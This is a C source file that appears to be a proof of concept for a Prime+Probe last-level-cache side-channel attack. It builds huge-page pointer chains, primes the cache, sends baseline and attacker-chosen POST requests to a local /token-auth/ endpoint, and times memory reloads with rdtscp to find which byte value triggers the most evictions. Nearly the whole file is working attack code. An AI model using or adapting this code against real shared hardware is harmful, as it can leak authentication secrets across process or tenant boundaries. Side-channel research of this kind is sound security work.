#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "attacker.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// LLC details
#define LLC_SETS 12288
#define LLC_WAYS 16
#define LLC_SIZE (LLC_WAYS * LLC_SETS * LINE_SIZE)
#define HUGE_PAGE_SIZE (2 * 1024 * 1024) // 2mb

// prime+probe
#define ATTACK_RUNS 10000
#define EVICTION_THRESHOLD 5000
#define CACHE_STRIDE 4096
#define PROBE_SIZE (256 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
#define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
#define MAX_TIME 20000
// socket  volatile uint8_t tmp = *(volatile uint8_t *)curr; 
#define PORT 8080
#define INET "127.0.0.1"

int clientfd;

uint8_t *probe_head;

uint64_t c_threshold;

char buf[1024]= {0};
char attack_data[256];

int main(int argc, char* argv[]) {
    mlockall(MCL_CURRENT | MCL_FUTURE);

     // setup socket connection 
    struct sockaddr_in servaddr;
    open_socket(&clientfd, &servaddr);
    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // allocate mem to probe_head
    probe_arr_setup();
    //printf("Probe array base address: %p\n", (void*)probe_head);
    // threshold for classifying cache miss
    //c_threshold = EVICTION_THRESHOLD;

    char *baseline_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 35\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=none&password=none&id=0000";
    
    get_inputs(attack_data, argc, argv);
    
    // get page table entries in cache lookup
    // for (int i = 0; i < SETS; i++) {
    //     for (int w = 0; w < WAYS; w++) {
    //         volatile uint8_t *addr = &probe_array[(w * 4096) + (i * LINE_SIZE)];
    //         volatile uint8_t dummy = *addr; 
    //     }
    // }
    // _mm_mfence();
    int max = 0;
    uint8_t spiking_byte;

    for (int i = 0; i < 256; i++){ // from byte 0x00 - 0xFF
        int total_diff  = 0;

        uint8_t target_byte = (uint8_t)i;//strtoul(argv[2], NULL, 0);
        printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);

        for (int r = 0; r < 10; r++){
            node_t *probe_arr = build_linked_list(target_byte);
            if (probe_arr == NULL){
                continue;
            }

            int baseline_count = 0;
            int attack_count = 0;
            for (int j = 0; j < ATTACK_RUNS; j++) {
                //PRIME
                prime_cache(probe_arr);
                _mm_lfence();
                // BASELINE
                send(clientfd, baseline_data, strlen(baseline_data), 0);
                recv(clientfd, buf, sizeof(buf), 0); 
                _mm_mfence();

                //PROBE
                check_cache_presence(probe_arr, &baseline_count);
                _mm_lfence();

                // = ATTACK =
                //PRIME
                prime_cache(probe_arr);
                _mm_lfence();

                // ATTACK
                send(clientfd, attack_data, strlen(attack_data), 0);
                recv(clientfd, buf, sizeof(buf), 0);

                //PROBE
                check_cache_presence(probe_arr, &attack_count);
                _mm_lfence();
            } 
            
            int diff = attack_count - baseline_count;
            if(diff > 0){
                total_diff += diff;
            }
            

            if(diff > 0){
                printf("ATTACK RUN %d\n- DIFF: %d\n- ATTACK: %d misses\n- BASELINE: %d misses\n",r ,diff, attack_count, baseline_count);
                printf("threshold used: %ld\n", c_threshold);
            }
        }
        if (total_diff > max){
            max = total_diff;
            spiking_byte = target_byte;
        }
        usleep(0);
    }   
    printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);

    close(clientfd);
    return 0;

}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
void probe_arr_setup(){
    // allocates mem for probe space (pointer chain)
    probe_head = mmap(NULL, PROBE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0); // allocate 512mb in RAM using hugetlb size pages (2MB)
    if (probe_head == MAP_FAILED) {
        perror("mmap failed - use sudo sysctl -w vm.nr_hugepages=256");
        exit(1);
    }
    memset(probe_head, 1, PROBE_SIZE); // make OS give physical ram 
}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
node_t* build_linked_list(uint8_t target_byte){
    // find addresses associated with the byte
    size_t byte_offset = CACHE_STRIDE * target_byte;

    node_t *byte_addresses[PAGE_COUNT] = {(node_t *)NULL};


    // loop for each page and get addresses for that byte#
    for (int p = 0; p < PAGE_COUNT; p++) {
        node_t *addr = (node_t *)(probe_head + (p * HUGE_PAGE_SIZE) + byte_offset);
        byte_addresses[p] = addr;
    }

    // shuffle to trick prefetcher
    for(int i = 0; i < PAGE_COUNT; i++){
        node_t *tmp = byte_addresses[i];
        int shuffle_index = rand() % PAGE_COUNT;
        // swap
        byte_addresses[i] = byte_addresses[shuffle_index];
        byte_addresses[shuffle_index] = tmp;
    }

    // link the pointer chain 
    for (int i = 0; i < PAGE_COUNT-1; i++){
        byte_addresses[i]->next = byte_addresses[i+1];
    }
    byte_addresses[PAGE_COUNT-1]->next = NULL;

    //uint64_t smart_thresh = avg_hit_time(byte_addresses[0]);

    c_threshold = 260;
    //printf("THRESHOLD: %ld\n", c_threshold);
    // return start of pointer chain
    return byte_addresses[0];
}

// Prime LLC
void prime_cache(node_t *base_ptr){
    // loops through pointer array for a byte 8 times
    for(int i = 0; i < 8; i++){
        node_t *current = base_ptr;
        while (current != NULL){
            volatile uint8_t tmp = *(volatile uint8_t *)current;
            current = current->next;
        }
    }
    _mm_mfence();
}

void check_cache_presence(node_t *base_ptr, int *result){
    unsigned int pid;
    node_t *current = base_ptr;
    int evictions = 0;
    
    _mm_mfence();
    
    while (current != NULL){
        uint64_t t1 = __rdtscp(&pid);
        _mm_lfence();
        volatile uint8_t tmp = *(volatile uint8_t *)current;
        _mm_lfence();
        uint64_t t2 = __rdtscp(&pid);
        
        if ((t2 - t1) > c_threshold){
            evictions++;
        }
        current = current->next;
        _mm_lfence();
    }
    
    (*result) += evictions;
}


void get_inputs(char attack_data[], int argc, char* argv[]){
    char *attack_id;
    if (argc >= 2){
        attack_id = argv[1]; 
    }else{
        printf("No Attack ID Entered\n");
        exit(1);
    }
    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);

    snprintf(attack_data, 512, 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);
}

void open_socket(int *clientfd, struct sockaddr_in *servaddr){
    
    *clientfd = socket(AF_INET, SOCK_STREAM, 0);

    //int flags = fcntl(*clientfd, F_GETFL, 0);
    //fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);

    servaddr->sin_family = AF_INET;
    servaddr->sin_port = htons(PORT);
    servaddr->sin_addr.s_addr = inet_addr(INET);
}


void shuffle(int shuffle_arr[]){
    for (int i = 0; i < LLC_SETS; i++){
        int tmp = shuffle_arr[i];
        int shuffle_index = rand() % LLC_SETS;
        shuffle_arr[i] = shuffle_arr[shuffle_index];
        shuffle_arr[shuffle_index] = tmp;
    }
}

uint64_t avg_hit_time(node_t *head){
    uint64_t hit_cycles = 0;
    uint64_t miss_cycles = 0;
    uint64_t runs = 0;
    char cal_buf[1024];
    
    char *baseline_data = 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: 35\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "username=none&password=none&id=0000";
    for(int i = 0; i < 100; i++) {
        prime_cache(head); // Ensure it's in cache

        send(clientfd, baseline_data, strlen(baseline_data), 0);
        recv(clientfd, cal_buf, sizeof(cal_buf), 0);
        

        unsigned int pid;
        node_t *current = head;

        while (current != NULL){
            // hit time
            uint64_t t1 = __rdtscp(&pid);
            _mm_lfence();
            volatile uint8_t tmp = *(volatile uint8_t *)current;
            _mm_lfence();
            uint64_t t2 = __rdtscp(&pid);
            hit_cycles += (t2 - t1);

            // miss time
            _mm_clflush(current);
            _mm_mfence();
            t1 = __rdtscp(&pid);
            _mm_lfence();
            volatile uint8_t tmp1 = *(volatile uint8_t *)current;
            _mm_lfence();
            t2 = __rdtscp(&pid);
            miss_cycles += (t2 - t1);

            runs +=1;
            current = current->next;
        }
        
    }
    
    uint64_t avg_hit_time = hit_cycles / runs;
    uint64_t avg_miss_time = miss_cycles / runs;
    //printf("MISS: %ld cycles\nHIT: %ld cycles\n", avg_miss_time, avg_hit_time);
    return (avg_hit_time + avg_miss_time) / 2;
}